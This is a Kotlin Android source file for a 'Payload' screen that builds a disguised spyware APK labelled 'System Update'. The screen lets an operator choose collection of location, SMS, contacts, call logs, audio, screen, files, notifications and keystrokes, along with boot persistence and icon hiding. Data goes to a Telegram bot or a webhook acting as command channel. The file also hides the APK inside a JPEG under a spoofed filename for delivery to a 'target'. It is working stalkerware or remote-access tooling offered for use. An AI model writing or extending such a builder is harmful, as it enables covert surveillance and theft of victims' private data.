package com.vector.console.ui.screens

import android.content.Context
import android.content.Intent
import android.net.Uri
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.ExperimentalLayoutApi
import androidx.compose.foundation.layout.FlowRow
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.rememberCoroutineScope
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.unit.dp
import androidx.core.content.FileProvider
import com.vector.console.data.Store
import com.vector.console.data.payload.MediaCarrier
import com.vector.console.data.payload.PayloadPackager
import com.vector.console.data.payload.PayloadSpec
import com.vector.console.data.payload.Telegram
import com.vector.console.data.payload.TelegramProbe
import com.vector.console.ui.components.ChoiceChip
import com.vector.console.ui.components.DividerLine
import com.vector.console.ui.components.FieldLabel
import com.vector.console.ui.components.GoldButton
import com.vector.console.ui.components.KeyValueRow
import com.vector.console.ui.components.LoadingLine
import com.vector.console.ui.components.OutlineActionButton
import com.vector.console.ui.components.PanelCard
import com.vector.console.ui.components.ScreenHeader
import com.vector.console.ui.components.SectionLabel
import com.vector.console.ui.components.Tag
import com.vector.console.ui.components.VectorTextField
import com.vector.console.ui.theme.Alert
import com.vector.console.ui.theme.Bone
import com.vector.console.ui.theme.BoneDim
import com.vector.console.ui.theme.Green
import com.vector.console.ui.theme.Muted
import com.vector.console.ui.theme.MutedDeep
import com.vector.console.ui.theme.Seal
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File

/**
 * Payload builder.
 *
 * The one thing this screen will not do is pretend the artifact is stealthy. Every toggle adds
 * a permission dialog or a Settings detour, and the friction counter says how many before the
 * build rather than after. The template is compiled once and lives in `assets/payload/`; this
 * screen only swaps its config asset and re-signs, so two deliveries differ by one small file
 * and share one signing identity per build.
 */
@OptIn(ExperimentalLayoutApi::class)
@Composable
fun PayloadScreen(store: Store) {
    val context = LocalContext.current
    val scope = rememberCoroutineScope()
    val scroll = rememberScrollState()

    var label by remember { mutableStateOf("System Update") }

    var location by remember { mutableStateOf(true) }
    var method by remember { mutableStateOf(PayloadSpec.LocationMethod.RADIO) }
    var sms by remember { mutableStateOf(false) }
    var contacts by remember { mutableStateOf(false) }
    var calls by remember { mutableStateOf(false) }
    var audio by remember { mutableStateOf(false) }
    var screen by remember { mutableStateOf(false) }
    var files by remember { mutableStateOf(false) }
    var notifications by remember { mutableStateOf(false) }
    var keylog by remember { mutableStateOf(false) }

    var boot by remember { mutableStateOf(true) }
    var foreground by remember { mutableStateOf(true) }
    var hideIcon by remember { mutableStateOf(false) }

    var transport by remember { mutableStateOf(PayloadSpec.Transport.TELEGRAM) }
    var token by remember { mutableStateOf(store.key("tg_token")) }
    var chat by remember { mutableStateOf(store.key("tg_chat")) }
    var webhook by remember { mutableStateOf(store.key("tg_webhook")) }
    var cadence by remember { mutableStateOf("30") }
    var wifiOnly by remember { mutableStateOf(false) }

    var probe by remember { mutableStateOf<TelegramProbe?>(null) }
    var probing by remember { mutableStateOf(false) }

    var result by remember { mutableStateOf<PayloadPackager.Result?>(null) }
    var carrier by remember { mutableStateOf<MediaCarrier.Report?>(null) }
    var busy by remember { mutableStateOf(false) }
    var note by remember { mutableStateOf<String?>(null) }

    val spec = PayloadSpec(
        label = label.trim().ifBlank { "System Update" },
        packageName = PayloadSpec.TEMPLATE_PACKAGE,
        collectLocation = location,
        locationMethod = method,
        collectSms = sms,
        collectContacts = contacts,
        collectCalls = calls,
        collectAudio = audio,
        collectScreen = screen,
        collectFiles = files,
        collectNotifications = notifications,
        collectKeylog = keylog,
        bootReceiver = boot,
        foregroundService = foreground,
        hideIcon = hideIcon,
        transport = transport,
        telegramToken = token.trim(),
        telegramChatId = chat.trim(),
        webhookUrl = webhook.trim(),
        cadenceSec = cadence.toIntOrNull() ?: 30,
        wifiOnlyUpload = wifiOnly
    )

    val problems = spec.validate()

    val pickCover = rememberLauncherForActivityResult(
        ActivityResultContracts.GetContent()
    ) { uri: Uri? ->
        val built = result ?: return@rememberLauncherForActivityResult
        if (uri == null) return@rememberLauncherForActivityResult
        scope.launch {
            busy = true
            note = null
            runCatching {
                withContext(Dispatchers.IO) {
                    val cover = context.contentResolver.openInputStream(uri)!!.use { it.readBytes() }
                    val wrapped = MediaCarrier.appendArchive(cover, built.apk)
                    val report = MediaCarrier.verify(wrapped, cover.size)
                    val name = MediaCarrier.spoofedName(
                        "IMG_" + System.currentTimeMillis().toString().takeLast(6), "jpg"
                    )
                    val file = export(context, name, wrapped)
                    share(context, file, "image/jpeg")
                    report
                }
            }.onSuccess { carrier = it }
                .onFailure { note = it.message }
            busy = false
        }
    }

    Column(
        modifier = Modifier
            .fillMaxWidth()
            .verticalScroll(scroll)
            .padding(horizontal = 16.dp, vertical = 18.dp)
    ) {
        ScreenHeader(
            kicker = "File 08 · Build",
            title = "Payload",
            subtitle = "Compiles a signed Android package from the bundled template. " +
                "Capabilities are config-gated, so the binary is identical across deliveries."
        )

        // ---- identity ------------------------------------------------------
        Spacer(Modifier.height(24.dp))
        SectionLabel(label = "Cover", trailing = "WHAT THEY SEE")
        Spacer(Modifier.height(10.dp))

        PanelCard(header = "Presentation") {
            FieldLabel("App label")
            Spacer(Modifier.height(6.dp))
            VectorTextField(
                value = label,
                onValueChange = { label = it },
                placeholder = "System Update"
            )
            Spacer(Modifier.height(10.dp))
            FieldLabel("Package name")
            Spacer(Modifier.height(6.dp))
            KeyValueRow(label = "Fixed", value = PayloadSpec.TEMPLATE_PACKAGE)
            Spacer(Modifier.height(8.dp))
            Text(
                text = "The package name is baked into the template's class descriptors, so " +
                    "changing it means recompiling the DEX, not repacking the ZIP. It is fixed " +
                    "and shown here as a fact. The label above is what the recipient sees, and " +
                    "that is rewritten per build.",
                style = MaterialTheme.typography.bodySmall,
                color = MutedDeep
            )
        }

        // ---- collection ----------------------------------------------------
        Spacer(Modifier.height(22.dp))
        SectionLabel(
            label = "Collection",
            trailing = "${gatesOn(spec)} ON"
        )
        Spacer(Modifier.height(10.dp))

        PanelCard(header = "Gates") {
            FlowRow(
                horizontalArrangement = Arrangement.spacedBy(6.dp),
                verticalArrangement = Arrangement.spacedBy(6.dp)
            ) {
                ChoiceChip(label = "Location", selected = location, onClick = { location = !location })
                ChoiceChip(label = "SMS", selected = sms, onClick = { sms = !sms })
                ChoiceChip(label = "Contacts", selected = contacts, onClick = { contacts = !contacts })
                ChoiceChip(label = "Call log", selected = calls, onClick = { calls = !calls })
                ChoiceChip(label = "Audio", selected = audio, onClick = { audio = !audio })
                ChoiceChip(label = "Screen", selected = screen, onClick = { screen = !screen })
                ChoiceChip(label = "Files", selected = files, onClick = { files = !files })
                ChoiceChip(label = "Notifs", selected = notifications, onClick = { notifications = !notifications })
                ChoiceChip(label = "Keylog", selected = keylog, onClick = { keylog = !keylog })
            }

            if (location) {
                Spacer(Modifier.height(14.dp))
                DividerLine()
                Spacer(Modifier.height(12.dp))
                FieldLabel("Fix method")
                Spacer(Modifier.height(8.dp))
                FlowRow(horizontalArrangement = Arrangement.spacedBy(6.dp)) {
                    PayloadSpec.LocationMethod.entries.forEach { option ->
                        ChoiceChip(
                            label = option.name,
                            selected = method == option,
                            onClick = { method = option }
                        )
                    }
                }
                Spacer(Modifier.height(8.dp))
                Text(
                    text = when (method) {
                        PayloadSpec.LocationMethod.RADIO ->
                            "Wi-Fi and cell fingerprint through beaconDB. Works indoors, ~30 m, " +
                                "a few hundred bytes per fix."
                        PayloadSpec.LocationMethod.GNSS ->
                            "Platform provider. ~5 m outdoors, no fix indoors, and the first fix " +
                                "can take 30 s."
                        PayloadSpec.LocationMethod.HYBRID ->
                            "Last known fix first, radio fallback. Most robust, slightly more " +
                                "battery."
                    },
                    style = MaterialTheme.typography.bodySmall,
                    color = Muted
                )
            }
        }

        // ---- persistence ---------------------------------------------------
        Spacer(Modifier.height(22.dp))
        SectionLabel(label = "Persistence")
        Spacer(Modifier.height(10.dp))

        PanelCard(header = "Survival") {
            FlowRow(
                horizontalArrangement = Arrangement.spacedBy(6.dp),
                verticalArrangement = Arrangement.spacedBy(6.dp)
            ) {
                ChoiceChip(label = "Boot receiver", selected = boot, onClick = { boot = !boot })
                ChoiceChip(label = "Foreground service", selected = foreground, onClick = { foreground = !foreground })
                ChoiceChip(label = "Hide icon", selected = hideIcon, onClick = { hideIcon = !hideIcon })
            }
            Spacer(Modifier.height(10.dp))
            Text(
                text = "A boot receiver plus a sticky foreground service is the entire non-root " +
                    "persistence story on Android. There is no other hook, and an uninstall " +
                    "removes all of it.",
                style = MaterialTheme.typography.bodySmall,
                color = MutedDeep
            )
        }

        // ---- reporting -----------------------------------------------------
        Spacer(Modifier.height(22.dp))
        SectionLabel(label = "Reporting", trailing = "C2")
        Spacer(Modifier.height(10.dp))

        PanelCard(header = "Channel") {
            FlowRow(horizontalArrangement = Arrangement.spacedBy(6.dp)) {
                PayloadSpec.Transport.entries.forEach { option ->
                    ChoiceChip(
                        label = option.name,
                        selected = transport == option,
                        onClick = { transport = option }
                    )
                }
            }
            Spacer(Modifier.height(12.dp))

            if (transport != PayloadSpec.Transport.WEBHOOK) {
                FieldLabel("Bot token")
                Spacer(Modifier.height(6.dp))
                VectorTextField(
                    value = token,
                    onValueChange = { token = it; probe = null },
                    placeholder = "123456789:AA…"
                )
                if (token.isNotBlank()) {
                    Spacer(Modifier.height(6.dp))
                    // The field scrolls to the caret, so a 46-character token shows its
                    // tail. This line proves the whole string is stored without asking
                    // the operator to scroll a text box.
                    Text(
                        text = tokenPreview(token),
                        style = MaterialTheme.typography.labelSmall,
                        color = MutedDeep
                    )
                }
                Spacer(Modifier.height(10.dp))
                FieldLabel("Chat id")
                Spacer(Modifier.height(6.dp))
                VectorTextField(
                    value = chat,
                    onValueChange = { chat = it },
                    placeholder = "12345678"
                )
                Spacer(Modifier.height(10.dp))
                OutlineActionButton(
                    label = if (probing) "Verifying" else "Verify bot",
                    enabled = token.isNotBlank() && !probing,
                    onClick = {
                        scope.launch {
                            probing = true
                            probe = null
                            note = null
                            runCatching {
                                withContext(Dispatchers.IO) { Telegram.probe(token) }
                            }.onSuccess {
                                probe = it
                                store.setKey("tg_token", token.trim())
                                if (chat.isBlank() && it.chatId != null) chat = it.chatId
                                store.setKey("tg_chat", chat.trim())
                            }.onFailure { note = it.message }
                            probing = false
                        }
                    },
                    modifier = Modifier.fillMaxWidth()
                )
                probe?.let {
                    Spacer(Modifier.height(8.dp))
                    Text(
                        text = it.summary(),
                        style = MaterialTheme.typography.labelSmall,
                        color = if (it.ready) Green else Seal
                    )
                }
                Spacer(Modifier.height(8.dp))
                Text(
                    text = "A token inside an APK is extractable by anyone who unpacks it. Treat " +
                        "every build as a burned bot.",
                    style = MaterialTheme.typography.bodySmall,
                    color = MutedDeep
                )
            }

            if (transport != PayloadSpec.Transport.TELEGRAM) {
                if (transport == PayloadSpec.Transport.BOTH) Spacer(Modifier.height(12.dp))
                FieldLabel("Webhook")
                Spacer(Modifier.height(6.dp))
                VectorTextField(
                    value = webhook,
                    onValueChange = { webhook = it },
                    placeholder = "https://example.test/hook"
                )
                Spacer(Modifier.height(8.dp))
                Text(
                    text = "Webhook carries text reports only — no document upload.",
                    style = MaterialTheme.typography.bodySmall,
                    color = MutedDeep
                )
            }

            Spacer(Modifier.height(12.dp))
            DividerLine()
            Spacer(Modifier.height(12.dp))
            FieldLabel("Cadence, seconds")
            Spacer(Modifier.height(6.dp))
            VectorTextField(
                value = cadence,
                onValueChange = { cadence = it.filter(Char::isDigit).take(4) },
                placeholder = "30"
            )
            Spacer(Modifier.height(10.dp))
            Row(horizontalArrangement = Arrangement.spacedBy(6.dp)) {
                ChoiceChip(
                    label = "Wi-Fi only upload",
                    selected = wifiOnly,
                    onClick = { wifiOnly = !wifiOnly }
                )
            }
        }

        // ---- friction ------------------------------------------------------
        Spacer(Modifier.height(22.dp))
        SectionLabel(
            label = "Install friction",
            trailing = "${spec.frictionSteps()} STEPS"
        )
        Spacer(Modifier.height(10.dp))

        PanelCard(header = "What the target must do") {
            KeyValueRow("Dialogs", "${spec.permissions().size} runtime grants")
            KeyValueRow("Settings", "${spec.settingsOnlyPermissions().size} detours")
            KeyValueRow("Zero-click", "none — no exploit path is used")
            val settings = spec.settingsOnlyPermissions()
            if (settings.isNotEmpty()) {
                Spacer(Modifier.height(8.dp))
                FlowRow(
                    horizontalArrangement = Arrangement.spacedBy(6.dp),
                    verticalArrangement = Arrangement.spacedBy(6.dp)
                ) {
                    settings.forEach { Tag(text = it, color = Seal) }
                }
            }
            if (problems.isNotEmpty()) {
                Spacer(Modifier.height(12.dp))
                DividerLine(color = Alert.copy(alpha = 0.5f))
                Spacer(Modifier.height(10.dp))
                problems.forEach { problem ->
                    Text(
                        text = "· $problem",
                        style = MaterialTheme.typography.bodySmall,
                        color = Alert
                    )
                    Spacer(Modifier.height(4.dp))
                }
            }
        }

        Spacer(Modifier.height(16.dp))
        GoldButton(
            label = if (busy) "Building" else if (result == null) "Build package" else "Rebuild",
            enabled = problems.isEmpty() && !busy,
            onClick = {
                scope.launch {
                    busy = true
                    note = null
                    carrier = null
                    store.setKey("tg_token", token.trim())
                    store.setKey("tg_chat", chat.trim())
                    store.setKey("tg_webhook", webhook.trim())
                    runCatching {
                        withContext(Dispatchers.IO) { PayloadPackager.build(context, spec) }
                    }.onSuccess {
                        result = it
                        note = "Built. Config asset injected and re-signed with a fresh key."
                    }.onFailure {
                        note = it.message ?: it::class.java.simpleName
                    }
                    busy = false
                }
            }
        )
        if (busy) {
            Spacer(Modifier.height(10.dp))
            LoadingLine(label = "REPACKING AND SIGNING")
        }
        note?.let {
            Spacer(Modifier.height(10.dp))
            Text(it, style = MaterialTheme.typography.bodySmall, color = Muted)
        }

        // ---- artifact ------------------------------------------------------
        result?.let { built ->
            Spacer(Modifier.height(22.dp))
            SectionLabel(label = "Artifact", trailing = "SIGNED v2")
            Spacer(Modifier.height(10.dp))

            PanelCard(header = "Package", trailing = formatSize(built.sizeBytes)) {
                KeyValueRow("Entries", "${built.entryCount}")
                KeyValueRow("Signer", built.signerFingerprint)
                KeyValueRow("Config", PayloadPackager.CONFIG_ENTRY)
                KeyValueRow("Install", built.installFriction)
                Spacer(Modifier.height(12.dp))
                DividerLine()
                Spacer(Modifier.height(12.dp))
                Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    OutlineActionButton(
                        label = "Save",
                        onClick = {
                            scope.launch {
                                runCatching {
                                    withContext(Dispatchers.IO) {
                                        val file = export(
                                            context,
                                            MediaCarrier.spoofedName(
                                                built.spec.label.replace(' ', '_'), "apk"
                                            ),
                                            built.apk
                                        )
                                        share(context, file, "application/vnd.android.package-archive")
                                    }
                                }.onFailure { note = it.message }
                            }
                        },
                        modifier = Modifier.weight(1f)
                    )
                    OutlineActionButton(
                        label = "Wrap in JPEG",
                        onClick = { pickCover.launch("image/*") },
                        modifier = Modifier.weight(1f)
                    )
                }
                Spacer(Modifier.height(8.dp))
                Text(
                    text = "Wrap produces one file that opens as a photo and carries the APK " +
                        "after the end-of-image marker. The share sheet decides what the " +
                        "recipient sees from the extension, so the extension is the delivery.",
                    style = MaterialTheme.typography.bodySmall,
                    color = MutedDeep
                )
            }

            if (built.warnings.isNotEmpty()) {
                Spacer(Modifier.height(10.dp))
                PanelCard(header = "Operational notes", trailing = "${built.warnings.size}") {
                    built.warnings.forEachIndexed { index, warning ->
                        if (index > 0) {
                            Spacer(Modifier.height(10.dp))
                            DividerLine()
                            Spacer(Modifier.height(10.dp))
                        }
                        Row(verticalAlignment = Alignment.Top) {
                            Box(
                                modifier = Modifier
                                    .padding(top = 5.dp)
                                    .width(2.dp)
                                    .height(12.dp)
                                    .background(Seal)
                            )
                            Spacer(Modifier.width(10.dp))
                            Text(
                                text = warning,
                                style = MaterialTheme.typography.bodySmall,
                                color = BoneDim
                            )
                        }
                    }
                }
            }

            carrier?.let { report ->
                Spacer(Modifier.height(10.dp))
                PanelCard(
                    header = "Carrier",
                    trailing = if (report.stillValidMedia && report.blobRecoverable) "VALID"
                    else "BROKEN"
                ) {
                    KeyValueRow("Cover", "${report.kind.name} · ${formatSize(report.coverBytes)}")
                    KeyValueRow("Blob", formatSize(report.blobBytes))
                    KeyValueRow("Total", formatSize(report.totalBytes))
                    KeyValueRow("Photo opens", if (report.stillValidMedia) "yes" else "no")
                    KeyValueRow("Archive reads", if (report.blobRecoverable) "yes" else "no")
                    Spacer(Modifier.height(10.dp))
                    Text(
                        text = report.note,
                        style = MaterialTheme.typography.bodySmall,
                        color = if (report.stillValidMedia && report.blobRecoverable) Green else Alert
                    )
                }
            }
        }

        Spacer(Modifier.height(28.dp))
    }
}

private fun gatesOn(spec: PayloadSpec): Int = listOf(
    spec.collectLocation, spec.collectSms, spec.collectContacts, spec.collectCalls,
    spec.collectAudio, spec.collectScreen, spec.collectFiles,
    spec.collectNotifications, spec.collectKeylog
).count { it }

/** `9273…f5g · 46 CHARS`: proves the whole token is stored without showing it twice. */
private fun tokenPreview(token: String): String {
    val clean = token.trim()
    if (clean.length <= 10) return "${clean.length} CHARS"
    return "${clean.take(4)}…${clean.takeLast(3)} · ${clean.length} CHARS"
}

private fun formatSize(bytes: Int): String = when {
    bytes >= 1_048_576 -> "%.1f MB".format(bytes / 1_048_576.0)
    bytes >= 1024 -> "%.0f KB".format(bytes / 1024.0)
    else -> "$bytes B"
}

private fun export(context: Context, name: String, bytes: ByteArray): File {
    val dir = File(context.getExternalFilesDir(null), "payload").apply { mkdirs() }
    return File(dir, name).apply { writeBytes(bytes) }
}

private fun share(context: Context, file: File, mime: String) {
    val uri = FileProvider.getUriForFile(context, "${context.packageName}.files", file)
    val intent = Intent(Intent.ACTION_SEND).apply {
        type = mime
        putExtra(Intent.EXTRA_STREAM, uri)
        addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
    }
    context.startActivity(Intent.createChooser(intent, "Deliver"))
}
